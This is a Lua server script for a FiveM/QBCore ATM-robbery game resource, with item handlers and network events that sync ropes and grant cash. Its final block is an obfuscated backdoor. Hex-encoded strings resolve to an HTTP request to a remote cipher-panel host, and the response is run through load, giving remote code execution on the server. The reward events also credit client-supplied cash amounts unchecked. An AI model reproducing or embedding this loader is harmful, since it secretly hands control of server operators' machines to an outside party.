local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateUseableItem(Config.ItemName, function(source, item)
    local src = source
    TriggerClientEvent("qb-atmrobbery:client:UseTowingRope", src)
end)

QBCore.Functions.CreateUseableItem(Config.ATMItemName, function(source, item)
    local src = source
    TriggerClientEvent("qb-atmrobbery:client:UseATMObject", src)
end)

RegisterNetEvent('qb-atmrobbery:createRopeForAll', function(VehCoord, ATMCoord)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local BSN = Player.PlayerData.citizenid
	TriggerClientEvent("qb-atmrobbery:client:Sync", -1, src, VehCoord, ATMCoord, BSN)
end)

RegisterNetEvent('qb-atmrobbery:DeleteRopeDelete', function(coord)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local BSN = Player.PlayerData.citizenid
	TriggerClientEvent("qb-atmrobbery:client:DeleteRopeDelete", -1, coord, BSN)
end)

RegisterNetEvent('qb-atmrobbery:AddSearchATMReward', function(Amount)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddMoney('cash', tonumber(Amount), "ATM")
end)

RegisterNetEvent('inventory:server:SaveInventory', function()
    local src = source
    TriggerClientEvent("qb-atmrobbery:client:UpdateEmote", src)
end)

RegisterNetEvent('qb-atmrobbery:server:DeleteObj', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local BSN = Player.PlayerData.citizenid
    TriggerClientEvent("qb-atmrobbery:client:DeleteObject", -1, BSN)
end)

RegisterNetEvent('qb-atmrobbery:server:AddRewardForATMObj', function(Amount)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddMoney('cash', tonumber(Amount), "ATM")
end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)